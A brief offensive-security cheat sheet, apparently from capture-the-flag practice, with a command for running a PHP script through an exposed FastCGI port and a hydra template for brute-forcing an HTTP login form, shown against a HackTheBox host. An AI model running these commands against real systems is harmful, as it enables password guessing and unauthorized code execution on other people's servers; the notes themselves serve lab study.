# attacking web

## FastCGI

- https://github.com/adoy/PHP-FastCGI-Client
- use client to execute php script: `./fcgiget.php localhost:9000/tmp/exp.php`

## HTTP login forms

### hydra
```
hydra -l username -P wordlist ip/hostname http-form-post "/login.php:uname=^USER^&passwd=^PASS^&Submit=Login:error-text
e.g.
hydra -l harvey -P ~/wordlist/10k.txt internal-01.bart.htb http-form-post "/simple_chat/login.php:uname=^USER^&passwd=^PASS^&Submit=Login:Invalid Username or Password"
```
